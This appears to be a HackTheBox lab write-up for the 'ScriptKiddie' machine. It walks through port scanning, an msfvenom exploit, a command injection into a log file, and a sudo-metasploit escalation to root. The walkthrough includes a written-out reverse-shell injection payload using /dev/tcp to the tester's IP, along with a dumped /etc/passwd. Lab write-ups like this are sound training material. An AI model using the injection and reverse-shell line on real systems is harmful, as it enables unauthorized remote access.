---
title: Scriptkiddie writeup
date: 2022-07-02 15:00:00 +0200
categories: [Writeup, HackTheBox]
tags: ["Easy-box", "metasploit"]     # TAG names should always be lowercase
img_path: /assets/img/boxes/scriptkiddie/
image: # Thumbnail 
  src: ScriptKiddie.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

## Summary
This box is centered around command injection in a bash script, an exploit in msfvenom, and exploiting metasploit into getting a root shell. Let's take a look.
## Foothold
We start out by doing an nmap port scan:

```console
┌──(bitis㉿workstation)-[~/htb/Machines/ScriptKiddie]
└─$ nmap -sC -sV 10.129.95.150
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 15:57 CEST
Nmap scan report for 10.129.95.150
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.42 seconds
```
If we go to the web application hosted on port 8000 we are greeted with a very basic page that allows us to work with nmap, searchsploit and msfvenom. 
![](welcome.png) 

Looking up exploits we find the following [exploit](https://www.exploit-db.com/exploits/49491) for msfvenom which gives us RCE on the target system.

We can use the exploit to produce a malicious apk template file for msfvenom. We then setup a listener and get a reverse shell on the system. 

```console
┌──(bitis㉿workstation)-[~/htb/Machines/ScriptKiddie]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.31] from (UNKNOWN) [10.129.95.150] 51500
id 
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```
## Pivot
Reading `/etc/password` we find another user named `pwn`: 

```console
kid@scriptkiddie:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
kid:x:1000:1000:kid:/home/kid:/bin/bash
pwn:x:1001:1001::/home/pwn:/bin/bash
```
In the users home directory we find a readable script, seen below:
```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```
The script reads from a file located in the kid users home directory. The script uses a space as a seperator, and the third field is read and used in the script as the variable `ip`. We can use this to inject commands in the script obtaining a reverse shell as the pwn user: `kid@scriptkiddie:~/logs$ echo 'a b $(bash -c "bash -i >& /dev/tcp/10.10.14.31/1337 0>&1")' >> hackers`
```console
┌──(bitis㉿workstation)-[~/htb/Machines/ScriptKiddie]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.31] from (UNKNOWN) [10.129.95.150] 51688
bash: cannot set terminal process group (862): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ 
```

## Privilege escalation

Running `sudo -l` we can see that we can run metasploit as sudo without a password:

```console
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole

```

While in metasploit we can start an interactive ruby session with the `irb` command, which we can then use to spawn a bash shell:

```console
sf6 > irb
stty: 'standard input': Inappropriate ioctl for device
[*] Starting IRB shell...
[*] You are in the "framework" object

system("/bin/bash")
Switch to inspect mode.
irb: warn: can't alias jobs from irb_jobs.
>> system("/bin/bash")
id
uid=0(root) gid=0(root) groups=0(root)
```
Rooted!